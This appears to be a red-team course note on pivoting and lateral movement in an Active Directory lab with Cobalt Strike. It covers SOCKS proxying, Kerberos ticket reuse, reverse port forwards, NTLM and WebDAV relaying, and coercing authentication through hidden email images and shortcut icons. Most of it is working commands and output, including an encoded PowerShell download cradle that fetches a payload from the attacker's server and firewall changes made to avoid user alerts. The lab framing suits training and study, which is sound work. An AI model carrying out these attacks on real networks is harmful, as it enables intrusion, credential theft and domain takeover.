## SOCKS Proxies

---

A SOCKS (short for Socket Secure) Proxy exchanges network packets between a client and a server.  A common implementation of a proxy server is found in web proxies - where a browser will connect to the proxy, which relays requests to the destination website and back to the browser (performing filtering etc along the way).  We can use this idea in an offensive application by turning our C2 server into a SOCKS proxy to tunnel external tooling into an internal network.

Use the `socks` command on the Beacon that you want to act as the pivot point.

To start a SOCKS4a proxy simply run:

```
beacon> socks 1080
```

For SOCKS5:

```
beacon> socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
```

The `enableLogging` option sends additional logs (such as authentication failures) to the VM console, which you unfortunately can't see easily when the team server running as a service.  Instead, you can use `journalctl`:  
  
```
ubuntu teamserver[687]: [*] SOCKS5 (18): ********** Constructing Socks5Command **********
ubuntu teamserver[687]: [*] SOCKS5 (18): Greeting: NoAuth Authentication offered: 0
ubuntu teamserver[687]: [*] SOCKS5 (18): Greeting: UserPwd Authentication offered: 2
ubuntu teamserver[687]: [*] SOCKS5 (18): sendChosenAuthentication: Chosen Authentication Type: 2
ubuntu teamserver[687]: [*] SOCKS5 (18): verifyUserPwd: Verifying User/Password Authentication
ubuntu teamserver[687]: [*] SOCKS5 (18): verifyUserPwd: Verifying user:
ubuntu teamserver[687]: [-] SOCKS5 (18): Invalid login attempt from user:
ubuntu teamserver[687]: [-] SOCKS (18): Socks Error
```

You will now see port 1080 bound on the team server VM.

```
attacker@ubuntu ~> sudo ss -lpnt
State    Recv-Q   Send-Q     Local Address:Port        Peer Address:Port   Process
LISTEN   0        128                    *:1080                   *:*       users:(("TeamServerImage",pid=687,fd=13))
```


## Linux Tools

---

`proxychains` is a tool which acts as a wrapper around other applications to tunnel their traffic over a socks proxy.  First, we need to modify its configuration file to point to our Cobalt Strike socks proxy.

```
attacker@ubuntu ~> sudo vim /etc/proxychains.conf
```

At the bottom of the file, you will see a default entry for SOCKS4:  `socks4 127.0.0.1 9050`.  We need to change this to match the settings of the proxy we started in Beacon.

- SOCKS4:  `socks4 127.0.0.1 1080`

OR  

- SOCKS5:  `socks5 127.0.0.1 1080 myUser myPassword`

To tunnel a tool through proxychains, it's as simple as `proxychains [tool] [tool args]`.  So to tunnel `nmap`, it would be:

```
attacker@ubuntu ~> proxychains nmap -n -Pn -sT -p445,3389,4444,5985 10.10.122.10
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-05 13:31 UTC
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.122.10:3389-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.122.10:445-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>>-10.10.122.10:4444-<--timeout
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.122.10:5985-<><>>-OK
Nmap scan report for 10.10.122.10
Host is up (0.061s latency).

PORT     STATE  SERVICE
445/tcp  open   microsoft-ds
3389/tcp open   ms-wbt-server
4444/tcp closed krb524
5985/tcp open   wsman

Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
```

There are some restrictions on the type of traffic that can be tunnelled, so you must make adjustments with your tools as necessary.  ICMP and SYN scans cannot be tunnelled, so we must disable ping discovery (`-Pn`) and specify TCP scans (`-sT`) for this to work.

You can also run tools from inside WSL on Windows.

```
ubuntu@DESKTOP-3BSK7NO ~ > proxychains wmiexec.py DEV/jking@10.10.122.30
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:135-<><>-OK
|S-chain|-<>-10.10.5.50:1080-<><>-10.10.122.30:49667-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
dev\jking

C:\>hostname
web
```


## Windows Tools

---

We can also tunnel traffic from our Windows machine using a software utility called [Proxifier](https://www.proxifier.com/).  To create a new proxy entry, go to **Profile > Proxy Servers**.  Click **Add** and enter the relevant details.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/871/92c/d2e/proxy-server.png)

When asked if you want to use this proxy by default, select **No**.  But select **Yes** when prompted to go to the **Proxification Rules**.  Here, we tell Proxifier which applications to proxy and under what conditions.

Click **Add** to create a new rule and use the following:

- Name:  Tools
- Applications:  Any
- Target hosts:  10.10.120.0/24;10.10.122.0/23
- Target ports:  Any
- Action:  Proxy SOCKS5 10.10.5.50

![](https://files.cdn.thinkific.com/file_uploads/584845/images/37a/06d/29b/proxy-rules.png)

To enable authentication to occur over the proxy, an application needs to be launched as a user from the target domain.  This can be achieved using `runas /netonly` or Mimikatz.

Let's use Active Directory Users and Computers (ADUC) as an example.  The file responsible for launching ADUC is `dsa.msc`, which is actually just a snap-in for `mmc.exe`.  Open a Command Prompt as a local admin, then launch mmc.exe via runas.

```
PS C:\Users\Attacker> runas /netonly /user:DEV\bfarmer mmc.exe
Enter the password for DEV\bfarmer:
Attempting to start mmc.exe as user "DEV\bfarmer" ...
```
  

Go to **File > Add/Remove Snap-in** (or Ctrl + M for short), add the ADUC snap-in, then click OK.  Right-click on the snap-in, select **Change Domain**, enter `dev.cyberbotic.io` and click OK.  You will see Proxifier begin to capture and relay traffic and ADUC loads the content.  You may continue to drill down into the users and computers etc.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/49e/ad9/9dd/aduc.png)

To achieve the same with Mimikatz:

[[mimikatz#Enable Authentication Over Proxy]]

PowerShell cmdlets that support credential objects can also be used.

```
PS C:\Users\Attacker> $cred = Get-Credential
PS C:\Users\Attacker> Get-ADComputer -Server 10.10.122.10 -Filter * -Credential $cred | select DNSHostName

DNSHostName
-----------
dc-2.dev.cyberbotic.io
fs.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
web.dev.cyberbotic.io
sql-2.dev.cyberbotic.io
wkstn-1.dev.cyberbotic.io
```


## Pivoting with Kerberos

---

1. Let's use `getTGT.py` to request a TGT for jking with their AES256 hash.
```
proxychains getTGT.py -dc-ip 10.10.122.10 -aesKey 4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 dev.cyberbotic.io/jking
```
2. We must first create an environment variable called **KRB5CCNAME** that will point to the ccache file.
```
export KRB5CCNAME=jking.ccache
```
3. Now we can use `psexec.py` to get a SYSTEM shell on WEB.
```
proxychains psexec.py -dc-ip 10.10.122.10 -target-ip 10.10.122.30 -no-pass -k dev.cyberbotic.io/jking@web.dev.cyberbotic.io
```

If you have a ticket in kirbi format obtained with another tool, it can be converted to ccache format for use with Impacket.  For example, here I'm using the TGT delegation trick to get a usable TGT for bfarmer from a non-elevated session.

[[Rubeus#tgtdeleg]]

Base64 decode the ticket and write it to `bfarmer.kirbi`.

``` bash
echo -en 'doIFzj[...snip...]MuSU8=' | base64 -d > bfarmer.kirbi
```

Then convert it using `ticketConverter.py`.

```
ticketConverter.py bfarmer.kirbi bfarmer.ccache
```

Now let's use this TGT to interact with the SQL-2 service.

```
proxychains mssqlclient.py -dc-ip 10.10.122.10 -no-pass -k dev.cyberbotic.io/bfarmer@sql-2.dev.cyberbotic.io
```

This may require adding a static host entry to `/etc/hosts` and changing the _proxy_dns_ setting in `/etc/proxychains.conf` to _remote_dns_.


Kerberos tickets can also be leveraged from the Windows attacker machine.
1. The first step is to add _*.cyberbotic.io_ your Proxifier proxification rule(s).  This is because Kerberos uses hostnames rather than IP addresses and Proxifier won't proxy Kerberos traffic unless the domains are explicitly set in the rules.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/433/8d7/81a/target-hosts.png)

2. Next, launch an instance of cmd.exe or powershell.exe using runas /netonly with a valid domain username, but a fake password.

```
PS C:\Users\Attacker> runas /netonly /user:dev.cyberbotic.io\bfarmer powershell.exe
Enter the password for dev.cyberbotic.io\bfarmer: FakePass
```

3. The spawned process will have no Kerberos tickets in its cache.

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x260072

Cached Tickets: (0)
```

4. This method of pivoting prefers the presence of the correct service ticket(s) up front, rather than relying on a single TGT in the cache.  If we want to access the SQL-2 service through HeidiSQL then we need a service ticket for the MSSQLSvc service.  Let's use the TGT of bfarmer to do that (yes, requesting tickets through the proxy works as well).

```
PS C:\Windows\system32> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /ticket:doIFzj[...snip...]MuSU8= /service:MSSQLSvc/sql-2.dev.cyberbotic.io:1433 /dc:dc-2.dev.cyberbotic.io /ptt
```

```
PS C:\Windows\system32> klist

Current LogonId is 0:0x260072

Cached Tickets: (1)
```

5. Launch HeidiSQL from the same powershell window.

```
PS C:\Windows\system32> C:\Tools\HeidiSQL\heidisql.exe
```

Set the target hostname to _sql-2.dev.cyberbotic.io_ and connect.

![](https://files.cdn.thinkific.com/file_uploads/584845/images/607/fd7/b78/heidi.png)


## Reverse Port Forwards

---

Reverse Port Forwarding allows a machine to redirect inbound traffic on a specific port to another IP and port.  A useful implementation of this allows machines to bypass firewall and other network segmentation restrictions, to talk to nodes they wouldn't normally be able to.

For example, we can use the console of **Domain Controller 2** to demonstrate that it does not have any outbound access to our team server.

```
PS C:\Users\Administrator> hostname
dc-2

PS C:\Users\Administrator> iwr -Uri http://nickelviper.com/a
iwr : Unable to connect to the remote server
```

We know of course that Workstation 2 does - so we can create a reverse port forward to relay traffic between Domain Controller 2 and our team server.

```
beacon> rportfwd 8080 127.0.0.1 80
[+] started reverse port forward on 8080 to 127.0.0.1:80
```

This will bind port 8080 on Workstation 2.

```
beacon> run netstat -anp tcp
TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
```

Any traffic hitting this port will be tunnelled back to the team server over the C2 channel.  The team server will then relay the traffic to the forward host/port, then send the response back over Beacon.  Now, we can download the file via this port forward.

```
PS C:\Users\Administrator> iwr -Uri http://wkstn-2:8080/a

StatusCode        : 200
```

**OPSEC**  
  
When the Windows firewall is enabled, it will prompt the user with an alert when an application attempts to listen on a port that is not explicitly allowed.  Allowing access requires local admin privileges and clicking cancel will create an explicit block rule.  
  
![](https://files.cdn.thinkific.com/file_uploads/584845/images/9f7/2d7/24e/alert.png)

You must therefore create an allow rule **before** running a reverse port forward using either `netsh` or `New-NetFirewallRule`, as adding and removing rules does not create a visible alert.

```
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

You can delete a firewall rule later by its `DisplayName`.

```
beacon> powershell Remove-NetFirewallRule -DisplayName "8080-In"
```


## NTLM Relaying

---

NTLM authentication uses a 3-way handshake between a client and server.  The high-level steps are as follows:

1. The client makes an authentication request to a server for a resource it wants to access.
2. The server sends a challenge to the client - the client needs to encrypt the challenge using the hash of their password.
3. The client sends the encrypted response to the server, which contacts a domain controller to verify the encrypted challenge is correct.

In an NTLM relay attack, an attacker is able to intercept or capture this authentication traffic and effectively allows them to impersonate the client against the same, or another service.  For instance, a client attempts to connect to Service A, but the attacker intercepts the authentication traffic and uses it to connect to Service B as though they were the client.

Requirements:
1. A [driver](https://reqrypt.org/windivert.html) to redirect traffic destined for port 445 to another port (e.g. 8445) that we can bind to.
2. A reverse port forward on the port the SMB traffic is being redirected to.  This will tunnel the SMB traffic over the C2 channel to our Team Server.
3. The tool of choice (ntlmrelayx) will be listening for SMB traffic on the Team Server.
4. A SOCKS proxy is to allow ntlmrelayx to send traffic back into the target network.

The flow looks something like this:

![](https://rto-assets.s3.eu-west-2.amazonaws.com/relaying/overview.png)

1. First, ensure all the pre-requisites are in place before launching the actual attack.  Obtain a SYSTEM beacon on the machine you will capture the SMB traffic on.
2. Next, allow those ports inbound on the Windows firewall.
```
beacon> powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```
3. Then start two reverse port forwards - one for the SMB capture, the other for a PowerShell download cradle.
```
beacon> rportfwd 8445 localhost 445
[+] started reverse port forward on 8445 to localhost:445

beacon> rportfwd 8080 localhost 80
[+] started reverse port forward on 8080 to localhost:80
```
4. The final part of the setup is to start a SOCKS proxy that ntlmrelayx can use to send relay responses back into the network.
```
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```
5. Now we can start `ntlmrelayx.py` listening for incoming connections on the Team Server.  The `-c` parameter allows us to execute an arbitrary command on the target after authentication has succeeded.
```
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t smb://10.10.122.10 -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA='
```

Where:

- 10.10.122.10 is the IP address of `dc-2.dev.cyberbotic.io`, which is our target.
- The encoded command is a download cradle pointing at `http://10.10.123.102:8080/b`, and `/b` is an SMB payload.

[PortBender](https://github.com/praetorian-inc/PortBender) is a reflective DLL and aggressor script specifically designed to help facilitate relaying through Cobalt Strike.  It requires that the driver be located in the current working directory of the Beacon.  It makes sense to use `C:\Windows\System32\drivers` since this is where most Windows drivers go.

```
beacon> cd C:\Windows\system32\drivers
beacon> upload C:\Tools\PortBender\WinDivert64.sys
```

Then go to _Cobalt Strike > Script Manager_ and load `PortBender.cna` from `C:\Tools\PortBender` - this adds a new `PortBender` command to the console.

```
beacon> help PortBender
Redirect Usage: PortBender redirect FakeDstPort RedirectedPort
Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password
Examples:
	PortBender redirect 445 8445
	PortBender backdoor 443 3389 praetorian.antihacker
```

Execute PortBender to redirect traffic from 445 to port 8445.

```
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP
```

To trigger the attack, we need to coerce a user or a machine to make an authentication attempt to Workstation 2.  Let's do it manually for now, by using the console of Workstation 1 as the user nlamb.  This user is a domain admin, so we can relay the authentication request to the domain controller.

```
C:\Users\nlamb>hostname
wkstn-1

C:\Users\nlamb>dir \\10.10.123.102\relayme
```

You should see PortBender log the connection and ntlmrelayx will spring into action.

```
[*] SMBD-Thread-3: Received connection from 127.0.0.1, attacking target smb://10.10.122.10
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.122.10:445-<><>-OK
[*] Authenticating against smb://10.10.122.10 as DEV/NLAMB SUCCEED
[*] Executed specified command on host: 10.10.122.10
```

ntlmrelayx reports that the command was executed - we can check the web log to confirm we received a hit.

```
09/05 13:34:16 visit (port 80) from: 127.0.0.1
	Request: GET /b
	page Scripted Web Delivery (powershell)
	null
```

All that's left is to link to the Beacon.

```
beacon> link dc-2.dev.cyberbotic.io TSVCPIPE-81180acb-0512-44d7-81fd-fbfea25fff10
[+] established link to child beacon: 10.10.122.10
```

#### NTLM Relaying to ADCS HTTP Endpoints

AD CS services support HTTP enrolment methods and even includes a GUI.  This endpoint is usually found at `http[s]://<hostname>/certsrv`.

If NTLM authentication is enabled, these endpoints are vulnerable to NTLM relay attacks.  A common abuse method is to coerce a domain controller to authenticate to an attacker-controlled location, relay the request to a CA to obtain a certificate for that DC, and then use it to obtain a TGT.

An important aspect to be aware of is that you cannot relay NTLM authentication back to the originating machine.  We therefore wouldn't be able to relay a DC to a CA if those services were running on the same machine.  This is indeed the case in the RTO lab, as each CA is running on a DC.

Another good way to abuse this primitive is by gaining access to a machine configured for unconstrained delegation.

To achieve this, we need:

- PortBender on Workstation 2 to capture traffic on port 445 and redirect it to port 8445.
- A reverse port forward to forward traffic hitting port 8445 to the team server on port 445.
- A SOCKS proxy for ntlmrelayx to send traffic back into the network.

The ntlmrelayx command needs to target the `certfnsh.asp` page on the ADCS server.

```
attacker@ubuntu ~> sudo proxychains ntlmrelayx.py -t https://10.10.122.10/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```

Then force the authentication to occur from WEB to WKSTN-2.

```
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.122.30 10.10.123.102
```

The S4U2Self trick can be used to obtain usable TGS's to move laterally to it. [[User Impersonation#S4U2Self Abuse]]

### Forcing NTLM Authentication

In the real world, it's unlikely you can just jump onto the console of a machine as a privileged user and authenticate to your malicious SMB server.  You can of course just wait for a random event to occur, or try to socially engineer a privileged user.  However, there are also lots of techniques to "force" users to unknowingly trigger NTLM authentication attempts to your endpoint.

Here are a few possibilities.

#### 1x1 Images in Emails

If you have control over an inbox, you can send emails that have an invisible 1x1 image embedded in the body.  When the recipients view the email in their mail client, such as Outlook, it will attempt to download the image over the UNC path and trigger an NTLM authentication attempt.

```
<img src="\\10.10.123.102\test.ico" height="1" width="1" />
```

A sneakier means may be to modify the sender's email signature, so that even legitimate emails they send will trigger NTLM authentication from every recipient who reads them.

#### Windows Shortcuts

A Windows shortcut can have multiple properties including a target, working directory and an icon.  Creating a shortcut with the icon property pointing to a UNC path will trigger an NTLM authentication attempt when it's viewed in Explorer (it doesn't even have to be clicked).  A good location for these is on publicly readable shares.

The easiest way to create a shortcut is with PowerShell.

```
$wsh = new-object -ComObject wscript.shell
$shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
$shortcut.IconLocation = "\\10.10.123.102\test.ico"
$shortcut.Save()
```

  

#### Remote Authentication Triggers

Tools such as [SpoolSample](https://github.com/leechristensen/SpoolSample), [SharpSystemTriggers](https://github.com/cube0x0/SharpSystemTriggers) and [PetitPotam](https://github.com/topotam/PetitPotam) can force a computer into authenticating to us.  These generally work via Microsoft RPC protocols, such as [MS-RPRN](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/d42db7d5-f141-4466-8f47-0a4be14e2fc1) and [MS-EFS](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4892c610-4595-4fba-a67f-a2d26b9b6dcd).


## Relaying WebDAV

---

Web Distributed Authoring and Versioning (aka WebDAV) is an extension that allows for basic file operations (create/copy/move/delete) over the HTTP protocol.  Windows supports the use of WebDAV via Explorer where users can enter a URI or map a drive to a WebDAV server.  The WebClient service facilitates Explorer's ability to use WebDAV.  This is set to `DEMAND_START` by default, so is generally only running if a user has actively used a WebDAV resource.  Some Windows technologies, such as SharePoint, use WebDAV fairly heavily.

```
C:\Users\bfarmer>sc qc WebClient
```

The [GetWebDAVStatus](https://github.com/G0ldenGunSec/GetWebDAVStatus) repo by [Dave Cossa](https://twitter.com/G0ldenGunSec) provides C# and BOF projects that check for the presence of this named pipe.

```
beacon> inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o wkstn-1,wkstn-2
```

The steps are to coerce the service into authenticating to a malicious WebDAV server that we control and then relay the authentication.  A nice aspect of this attack is that we can force authentication to occur over any port, so we don't have to worry about needing PortBender (I can hear you all cheering).  All we need to ensure is that whatever port we choose is allowed inbound on the host firewall we're reverse port forwarding from.

1. The incoming authentication material will be that of the machine account.  ntlmrelayx can relay this to LDAP on a domain controller to abuse either RBCD (using the `--delegate-access` flag) or shadow creds (using the `--shadow-credentials` flag).  In either case, ensure you run the HTTP server on a port that will not clash with any of your HTTP listeners.  In this example, I've used port 8888.

```
sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --delegate-access -smb2support --http-port 8888
```

2. Once that's up and running, punch a hole in the firewall and set the reverse port forward.

```
beacon> powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888
beacon> rportfwd 8888 localhost 8888
```

3. Then use SharpSystemTriggers to trigger the authentication.  The WebDAV URL needs to point to the reverse port forward.

```
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe wkstn-1 wkstn-2@8888/pwned
```

4. Once the traffic hits ntlmrelayx, it will relay to the domain controller.

```
[*] HTTPD(8888): Connection from 127.0.0.1 controlled, attacking target ldaps://10.10.122.10
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.122.10:636-<><>-OK
[*] HTTPD(8888): Authenticating against ldaps://10.10.122.10 as DEV/WKSTN-1$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Attempting to create computer in: CN=Computers,DC=dev,DC=cyberbotic,DC=io
[*] Adding new computer with username: PVWUMPYT$ and password: 4!t1}}I_CGJ}0OJ result: OK
[*] Delegation rights modified succesfully!
[*] PVWUMPYT$ can now impersonate users on WKSTN-1$ via S4U2Proxy
```

5. As indicated by the output above, a new machine account **PVWUMPYT\$** was created with password `4!t1}}I_CGJ}0OJ`, which now has delegation rights to WKSTN-1$.  To complete the attack chain, calculate the AES256 hash from the password.

```
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:dev.cyberbotic.io /user:PVWUMPYT$ /password:'4!t1}}I_CGJ}0OJ'
```

6. Then perform the S4U2Proxy to request service tickets of your choosing. [[Rubeus#s4u#AES256]]
7. Don't forget to remove the fake computer account.


The shadow credentials option will automatically dump a certificate file for you.

```
sudo proxychains ntlmrelayx.py -t ldaps://10.10.122.10 --shadow-credentials -smb2support --http-port 8888
```

It can be converted to ccache format to use with Impacket, or base64 encoded to use with Rubeus.

```
cat ROsU1G59.pfx | base64 -w 0
```

Since this is a certificate, we use it to request a TGT first which can then be used for S4U2Self. [[Rubeus#asktgt#Get AES Ticket]]

Ensure the keys are deleted after the attack.
